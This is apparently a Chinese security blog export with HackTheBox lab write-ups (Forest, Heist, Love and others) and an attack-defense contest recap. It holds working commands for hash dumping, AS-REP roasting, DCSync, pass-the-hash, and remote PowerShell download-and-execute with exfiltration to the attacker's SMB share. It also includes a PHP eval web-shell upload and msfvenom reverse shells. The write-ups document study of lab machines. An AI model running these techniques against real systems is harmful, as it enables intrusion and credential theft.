复制SAM文件和SYSTEM文件 12cp /tmp/vhd/Windows/System32/config/SYSTEM /root/cp /tmp/vhd/Windows/System32/config/SAM /root/ 取消挂载 1234umount /tmp/vhdqemu-nbd -d /dev/nbd0rmmod nbdumount /tmp/l4mpje-pc dump出Hash 12345678python secretsdump.py local -system /root/SYSTEM -sam /root/SAM[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::[*] Cleaning up... 解密得到明文 123john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashbureaulampje (?) SSH登入 12345ssh L4mpje@10.10.10.134bureaulampjetype Desktop\\user.txt 9bfe57d5c3309db3a151772f9d86c6cd 权限提升 找到mRemoteNG程序的凭证储存 123type \\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\\confCons.xmlUsername=&quot;Administrator&quot; Domain=&quot;&quot; Password=&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot; 还原管理员口令 1234wget https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/master/mremoteng_decrypt.pypython mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==Password: thXLHM96BeKL0ER2 ssh登入 12345ssh administrator@10.10.10.134thXLHM96BeKL0ER2type \\Users\\Administrator\\Desktop\\root.txt 958850b91811676ed6620a9c430e65c8 HackTheBox_Forest 端口扫描 123456789101112131415161718nmap -sV -sT -Pn 10.10.10.161Nmap scan report for 10.10.10.161Host is up (0.081s latency).Not shown: 989 closed portsPORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-05 14:34:46Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows 漏洞利用 还是DC 跑出来域名和一些用户名 123456789101112131415161718192021222324252627282930313233343536373839404142434445enum4linux 10.10.10.161 =========================================== | Getting domain SID for 10.10.10.161 | =========================================== Domain Name: HTBDomain Sid: S-1-5-21-3072663084-364016917-1341370565[+] Host is part of a domain (not a workgroup)----- ============================= | Users on 10.10.10.161 | ============================= user:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[$331000-VK4ADACQNUCA] rid:[0x463]user:[SM_2c8eef0a09b545acb] rid:[0x464]user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]user:[SM_75a538d3025e4db9a] rid:[0x466]user:[SM_681f53d4942840e18] rid:[0x467]user:[SM_1b41c9286325456bb] rid:[0x468]user:[SM_9b69f1b9d2cc45549] rid:[0x469]user:[SM_7c96b981967141ebb] rid:[0x46a]user:[SM_c75ee099d0a64c91b] rid:[0x46b]user:[SM_1ffab36a2f5f479cb] rid:[0x46c]user:[HealthMailboxc3d7722] rid:[0x46e]user:[HealthMailboxfc9daad] rid:[0x46f]user:[HealthMailboxc0a90c9] rid:[0x470]user:[HealthMailbox670628e] rid:[0x471]user:[HealthMailbox968e74d] rid:[0x472]user:[HealthMailbox6ded678] rid:[0x473]user:[HealthMailbox83d6781] rid:[0x474]user:[HealthMailboxfd87238] rid:[0x475]user:[HealthMailboxb01ac64] rid:[0x476]user:[HealthMailbox7108a4e] rid:[0x477]user:[HealthMailbox0659cc1] rid:[0x478]user:[sebastien] rid:[0x479]user:[lucinda] rid:[0x47a]user:[svc-alfresco] rid:[0x47b]user:[andy] rid:[0x47e]user:[mark] rid:[0x47f]user:[santi] rid:[0x480] Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts. https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting AS-REP Roasting 12345python GetNPUsers.py HTB/svc-alfresco -request -no-pass -dc-ip 10.10.10.161Impacket v0.9.23.dev1 - Copyright 2020 SecureAuth Corporation[*] Getting TGT for svc-alfresco$krb5asrep$23$svc-alfresco@HTB:74aacc88dcebdc99fbdfad38ea7bfb86$0f390178e508b52f3547f4784f435ca5955e6086b719aab1723ec0d13c900d4b0b7e4a00c10162b5615fb8c93e90f34a1746b5de60400cac0a2eae9ecab1a1d16f1d41958d72811ba73835e3177ea538e77888a207a47537c83644879fa792b5d31b965dd75aef7409dc34ba0b2df67eb987db6779846f330d563277f97e004484f67e7a853beec8e7552b427ac4c43fabd3f523a365f80a43f90f587ee08bbc8d06ad907d9efc5a6541714f92fe3c7626dd539daa45d54a4ef5733579277c65f7d11ca380184131a767428ca62077e4553fd8d86d1e7340da4b41b115357485 爆破口令明文 123john --wordlist=/usr/share/wordlists/rockyou.txt hashs3rvice ($krb5asrep$23$svc-alfresco@HTB) evil-winrm登入 1234evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvicetype C:\\users\\svc-alfresco\\desktop\\user.txte5e4e47ae7022664cda6eb013fb0d9ed 权限提升 下载bloodhound的powershell版本的collector，开启HTTP服务和SMB服务(impacket) 1234wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1python -m http.server 9998&amp;python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp; 靶机上下载bloodhound collector并回传输出文件 1234567iex(new-object net.webclient).downloadstring(&quot;http://10.10.16.11:9998/PowerView.ps1&quot;)iex(new-object net.webclient).downloadstring(&quot;http://10.10.16.11:9998/SharpHound.ps1&quot;)powershell -exec bypassinvoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvicenet use \\\\10.10.16.11\\Bufferfly /u:Buffer flycopy 20210705223815_BloodHound.zip \\\\10.10.16.11\\Bufferfly\\net use /d \\\\10.10.16.11\\Bufferfly bloodhound的内容实在是看不懂，看了WP 大概思路是 用户&quot;svc-alfresco&quot;拥有账户操作权限，可以创建域账户 用户&quot;svc-alfresco&quot;完全控制&quot;Exchange Windows Permissions&quot;组(GenericAll)，可以将&quot;svc-alfresco&quot;加入&quot;Exchange Windows Permissions&quot;组 &quot;Exchange Windows Permissions&quot;组可以修改域用户的ACL(WriteDacl) 用户&quot;svc-alfresco&quot;利用&quot;Exchange Windows Permissions&quot;组的权限赋予&quot;DCSync&quot;权限 利用这个域账户进行DCSync攻击 添加域用户 1net user bufferfly bufferfly /add /domain 执行命令后重新Getshell 1Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members svc-alfresco 查看组 1234whoami /groupsHTB\\Exchange Windows Permissions Group S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled groupHTB\\Exchange Trusted Subsystem Group S-1-5-21-3072663084-364016917-1341370565-1119 Mandatory group, Enabled by default, Enabled grou 添加DCSync权限(PowerView.ps1) 1Add-DomainObjectAcl -TargetIdentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity bufferfly -Rights DCSync DCSync攻击 123python secretsdump.py -just-dc &quot;htb/bufferfly:bufferfly@10.10.10.161&quot;htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Hash登入 1234evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6type c:\\users\\administrator\\desktop\\root.txtf048153f202bbb2f82622b04d79129cc 貌似svc-alfresco不是域用户，而DCSync的操作需要一个域用户的凭证 Powershell在运行命令时貌似会自动地从ps1文件载入函数，很方便 HackTheBox_Heist 端口扫描 12345678910nmap -sV -sT -Pn 10.10.10.149Nmap scan report for 10.10.10.149Host is up (0.24s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 漏洞利用 访问http://10.10.10.149/attachments/config.txt cisco的密码可以在线破解(https://www.ifm.net.nz/cookbooks/passwordcracker.html) md5直接john爆破 得到一些账户 123rout3r:$uperP@sswordadmin:Q4)sJu\\Y8qz*A3?dsecret:stealth1agent 测试hazard的密码(由于未知原因，hydra不能爆破SMB) 1234567smbmap -H 10.10.10.149 -u hazard -p stealth1agent Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC 枚举域账户信息 1234567891011python lookupsid.py hazard:stealth1agent@heist500: SUPPORTDESK\\Administrator (SidTypeUser)501: SUPPORTDESK\\Guest (SidTypeUser)503: SUPPORTDESK\\DefaultAccount (SidTypeUser)504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser)513: SUPPORTDESK\\None (SidTypeGroup)1008: SUPPORTDESK\\Hazard (SidTypeUser)1009: SUPPORTDESK\\support (SidTypeUser)1012: SUPPORTDESK\\Chase (SidTypeUser)1013: SUPPORTDESK\\Jason (SidTypeUser) 字典 12345678910111213141516cat userhazardadministratoradminrout3radminsecretsupportChase------cat pass$uperP@sswordQ4)sJu\\Y8qz*A3?dstealth1agent 爆破winrm服务 123crackmapexec winrm 10.10.10.149 -d heist -u user -p passWINRM 10.10.10.149 5985 10.10.10.149 [+] heist\\Chase:Q4)sJu\\Y8qz*A3?d (Pwn3d!) winrm登入 1234evil-winrm -i 10.10.10.149 -u chase -p &quot;Q4)sJu\\Y8qz*A3?d&quot;type c:\\users\\chase\\desktop\\user.txta127daef77ab6d9d92008653295f59c4 权限提升 查看进程 1234567ps 378 28 25008 62440 1.16 6216 1 firefox 355 25 16444 38908 0.27 6564 1 firefox 1050 73 172600 248916 13.88 6732 1 firefox 347 19 9972 34476 0.23 6844 1 firefox 401 34 40728 101244 3.31 6956 1 firefox 可以看看firefox进程内存 开启HTTP服务与SMB服务 12python -m http.server 9998&amp;python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp; 上传procdump并回传firefox进程内存 12345wget -uri http://10.10.16.14:9998/procdump64.exe -outfile procdump64.exe./procdump64.exe -accepteula -ma 6216net use \\\\10.10.16.14\\Bufferfly /u:Buffer flycopy firefox.exe_210706_221007.dmp \\\\10.10.16.14\\Bufferfly\\net use /d \\\\10.10.16.14\\Bufferfly 查找admin相关信息 123grep -a admin firefox.exe_210706_221007.dmplocalhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ wimrm登入 1234evil-winrm -i 10.10.10.149 -u administrator -p &#x27;4dD!5&#125;x/re8]FBuZ&#x27;type c:\\users\\administrator\\desktop\\root.txt50dfa3c6bfd20e2e0d071b073d766897 还是没想通为啥hydra爆不了smb，以后有机会再试试 EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"}]},{"title":"CISCN-SE_Semifinal","slug":"CISCN-SE-Semifinal","date":"2021-07-04T20:21:31.000Z","updated":"2021-07-04T09:00:38.000Z","comments":true,"path":"2021/07/04/CISCN-SE-Semifinal/","link":"","permalink":"https://yoloyolo.top/2021/07/04/CISCN-SE-Semifinal/","excerpt":"25/60 三等奖(二等奖守门员)","text":"25/60 三等奖(二等奖守门员) 人手不足（3/4） 第二天的比赛时间提前导致状态不佳 … 由于各种各样的原因，拿到了这个名次，遗憾也不能说一点都没有 但也足够了 首先聊下这个比赛的得分机制 被Getflag会被扣100分，由攻击队伍平摊 被Check会被扣100分，由服务正常的队伍平摊 先不说DOS搅屎了，同时被Getflag和被Check的情况是要尽量避免的，实在看不到怎么被打的就删站拉倒 当然，能保证服务运行也是件好事，因为比赛中后期出现了一大半宕机的情况，即使被打了，只要保证服务的正常反而可以上分 其次，PWN机我们不会打也不会修，但是不妨碍我们拿别人的Payload打别人（pwntools重放流量就完事了） 由于自己的疏忽，没在第一时间注意到服务器上的流量备份，错失了几千分 另外，由于PWN的Getflag是给出一个sh来执行cat /flag，而不是自动执行cat /flag，所以完全可以留住这个sh，后面再继续Getflag（别人的思路，太骚了） 如果碰巧别人删掉了程序放弃运维，就可以双倍扣分 Web的就好说了，看看自己服务器上有哪些马，然后批量上马，然后从流量里面翻别人的Payload 由于没有做网络隔离（赛前nmap了下，能通其他队的服务器和选手机器），所以完全可以在别人的服务器上传一个Meterpreter的反弹Shell马 从防守方来讲，程序马的运行权限是www-data，运维的权限是ctf，所以完全可以自己写一个后门来获得www-data权限，然后就可以用system函数来kill掉程序马 这个思路同样可以用来运维其他的情况 这次比赛Ban了不死马 所以，理想化的AWD流程，其实还是应该按CTF的思路来 A负责源码审计以及修复 B负责监管流量来查看服务器上的后门以及其他队伍的Payload C负责脚本编写以及运维 D负责脚本编写真空期的手动提交flag以及其他工作（例如PWN题的sh保留） A挖到漏洞就让C写Getflag脚本，同时D可以手动Getflag B看到Payload就可以让A进行修复，并让C编写Getflag脚本，同时D可以手动Getflag 学到了很多，希望以后能用得上这些经验","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"AWD","slug":"AWD","permalink":"https://yoloyolo.top/tags/AWD/"},{"name":"CISCN","slug":"CISCN","permalink":"https://yoloyolo.top/tags/CISCN/"}]},{"title":"HackTheBox_Windows_Set_0","slug":"HackTheBox-Windows-Set-0","date":"2021-06-09T21:20:32.000Z","updated":"2023-02-14T15:38:32.000Z","comments":true,"path":"2021/06/09/HackTheBox-Windows-Set-0/","link":"","permalink":"https://yoloyolo.top/2021/06/09/HackTheBox-Windows-Set-0/","excerpt":"The more knowledge you drink, the more thirsty you are.","text":"The more knowledge you drink, the more thirsty you are. HackTheBox_love 端口扫描 12345678910111213141516171819202122232425262728293031323334353637383940414243444546nmap -sV -sT -Pn 10.10.10.239Nmap scan report for 10.10.10.239Host is up (0.87s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql?5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=6/9%Time=60C04557%P=x86_64-pc-linux-gnu%r(NULSF:L,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowedSF:\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(GenericLines,4SF:9,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x2SF:0to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(HTTPOptions,49,&quot;ESF:\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\SF:x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(RPCCheck,49,&quot;E\\0\\0\\x0SF:1\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connSF:ect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(DNSStatusRequestTCP,49,&quot;E\\0\\SF:0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20SF:connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(TerminalServerCookie,49,SF:&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20tSF:o\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(Kerberos,49,&quot;E\\0\\0\\SF:x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20coSF:nnect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(X11Probe,49,&quot;E\\0\\0\\x01\\xffSF:j\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\xSF:20to\\x20this\\x20MariaDB\\x20server&quot;)%r(FourOhFourRequest,49,&quot;E\\0\\0\\x01\\xSF:ffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connectSF:\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(LDAPSearchReq,49,&quot;E\\0\\0\\x01\\xffSF:j\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\xSF:20to\\x20this\\x20MariaDB\\x20server&quot;)%r(LDAPBindReq,49,&quot;E\\0\\0\\x01\\xffj\\x0SF:4Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20toSF:\\x20this\\x20MariaDB\\x20server&quot;)%r(SIPOptions,49,&quot;E\\0\\0\\x01\\xffj\\x04HostSF:\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20tSF:his\\x20MariaDB\\x20server&quot;)%r(TerminalServer,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\SF:x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20thSF:is\\x20MariaDB\\x20server&quot;)%r(NCP,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.SF:16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDSF:B\\x20server&quot;)%r(JavaRMI,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\xSF:20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20serSF:ver&quot;);Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows 1234567891011121314151617181920nmap -A -p 443 10.10.10.239Nmap scan report for 10.10.10.239Host is up (0.75s latency).PORT STATE SERVICE VERSION443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after: 2022-01-18T14:00:16|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 SP2 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Hosts: www.example.com, www.love.htb 这里需要对SSL端口进行更加详细的扫描才能得到域名staging.love.htb 不使用域名访问443端口则会被403 5000端口则是直接403 漏洞利用 用域名访问443端口可以看到一个LFI漏洞 file协议读取即可 123456789101112131415161718192021222324252627282930313233&lt;?php #C:\\xampp\\htdocs\\omrs\\login.php session_start(); include &#x27;includes/conn.php&#x27;; if(isset($_POST[&#x27;login&#x27;]))&#123; $voter = $_POST[&#x27;voter&#x27;]; $password = $_POST[&#x27;password&#x27;]; $sql = &quot;SELECT * FROM voters WHERE voters_id = &#x27;$voter&#x27;&quot;; $query = $conn-&gt;query($sql); if($query-&gt;num_rows &lt; 1)&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Cannot find voter with the ID&#x27;; &#125; else&#123; $row = $query-&gt;fetch_assoc(); if(password_verify($password, $row[&#x27;password&#x27;]))&#123; $_SESSION[&#x27;voter&#x27;] = $row[&#x27;id&#x27;]; &#125; else&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Incorrect password&#x27;; &#125; &#125; &#125; else&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Input voter credentials first&#x27;; &#125; header(&#x27;location: index.php&#x27;);?&gt; 123456789&lt;?php #C:\\xampp\\htdocs\\omrs\\admin\\includes\\conn.php $conn = new mysqli(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;&#x27;, &#x27;votesystem&#x27;); if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . $conn-&gt;connect_error); &#125; ?&gt; 123456789101112131415161718192021222324252627282930313233&lt;?php #C:\\xampp\\htdocs\\omrs\\admin\\login.php session_start(); include &#x27;includes/conn.php&#x27;; if(isset($_POST[&#x27;login&#x27;]))&#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $sql = &quot;SELECT * FROM admin WHERE username = &#x27;$username&#x27;&quot;; $query = $conn-&gt;query($sql); if($query-&gt;num_rows &lt; 1)&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Cannot find account with the username&#x27;; &#125; else&#123; $row = $query-&gt;fetch_assoc(); if(password_verify($password, $row[&#x27;password&#x27;]))&#123; $_SESSION[&#x27;admin&#x27;] = $row[&#x27;id&#x27;]; &#125; else&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Incorrect password&#x27;; &#125; &#125; &#125; else&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Input admin credentials first&#x27;; &#125; header(&#x27;location: index.php&#x27;);?&gt; 123456789&lt;?php #C:\\xampp\\htdocs\\omrs\\admin\\includes\\conn.php $conn = new mysqli(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;&#x27;, &#x27;votesystem&#x27;); if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . $conn-&gt;connect_error); &#125; ?&gt; 明显地存在SQL注入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667sqlmap -u &quot;http://10.10.10.239/login.php&quot; -data &quot;voter=123&amp;password=321&amp;login=&quot; --dbsavailable databases [6]:[*] information_schema[*] mysql[*] performance_schema[*] phpmyadmin[*] test[*] votesystemsqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem --tablesDatabase: votesystem[5 tables]+------------+| admin || candidates || positions || voters || votes |+------------+sqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem -T admin --columnsDatabase: votesystemTable: admin[7 columns]+------------+--------------+| Column | Type |+------------+--------------+| created_on | date || firstname | varchar(50) || id | int(11) || lastname | varchar(50) || password | varchar(60) || photo | varchar(150) || username | varchar(50) |+------------+--------------+sqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem -T admin -C username, password --dumpDatabase: votesystemTable: admin[1 entry]+----------+--------------------------------------------------------------+| username | password |+----------+--------------------------------------------------------------+| admin | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC |+----------+--------------------------------------------------------------+sqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem -T voters --columnsDatabase: votesystemTable: voters[6 columns]+-----------+--------------+| Column | Type |+-----------+--------------+| firstname | varchar(30) || id | int(11) || lastname | varchar(30) || password | varchar(60) || photo | varchar(150) || voters_id | varchar(15) |+-----------+--------------+sqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem -T voters -C voters_id, password --dump+-----------+----------+| voters_id | password |+-----------+----------++-----------+----------+ 然而这里Hash爆破速度过慢, Bcrypt的运算复杂程度远高于md5 看了眼别人WP 用443端口的功能访问本地5000得到登入凭证 admin:@LoveIsInTheAir!!!! 一直用渗透的常规思路打这台靶机, 没想到整这么一出 登入后台后上传Shel 1234567891011121314151617181920212223242526272829303132333435363738POST /admin/voters_add.php HTTP/1.1Host: 10.10.10.239User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------7586397232801671174932942436Content-Length: 696Origin: http://10.10.10.239Connection: closeReferer: http://10.10.10.239/admin/voters.phpCookie: PHPSESSID=uofg65u57tbm4rp6jbn0359660Upgrade-Insecure-Requests: 1-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;firstname&quot;1-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;lastname&quot;2-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;password&quot;333-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;shell.php&quot;Content-Type: image/jpeg&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;add&quot;-----------------------------7586397232801671174932942436-- 蚁剑上传nc反弹shell 12type c:\\users\\phoebe\\desktop\\user.txtfc8833cab6af6700441328fd2a4ecc04 权限提升 找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。 https://zhuanlan.zhihu.com/p/375373404 123456789reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\InstallerHKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\InstallerHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1 msfvenom生成一个Shell即可 12type c:\\users\\administrator\\desktop\\root.txta0f54f7853efdefe4c8cef97186db4c8 msfvenom &amp; nc 本着能不用MSF就不用了MSF的原则 没有使用meterpreter 但是发现有(staged)标识还是不能用nc直接接收Shell的 最后用windows/x64/shell/reverse_tcp HackTheBox_Atom 端口扫描 1234567891011nmap -sV -sT -Pn 10.10.10.237Nmap scan report for 10.10.10.237Host is up (0.30s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)135/tcp open msrpc Microsoft Windows RPC443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows 漏洞利用 123456789smbclient -L 10.10.10.237 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Software_Updates Disk SMB1 disabled -- no workgroup available 1234567891011smbclient \\\\\\\\10.10.10.237\\\\software_updatessmb: \\&gt; dir . D 0 Fri Jun 11 11:18:21 2021 .. D 0 Fri Jun 11 11:18:21 2021 client1 D 0 Fri Jun 11 11:18:21 2021 client3 D 0 Fri Jun 11 11:18:21 2021 UAT_Testing_Procedures.pdf A 35202 Fri Apr 9 19:18:08 2021 4413951 blocks of size 4096. 1381036 blocks availablesmb: \\&gt; get UAT_Testing_Procedures.pdfgetting file \\UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (6.3 KiloBytes/sec) (average 6.3 KiloBytes/sec) Note taking application built with electron-builder which helps users in taking important notes. 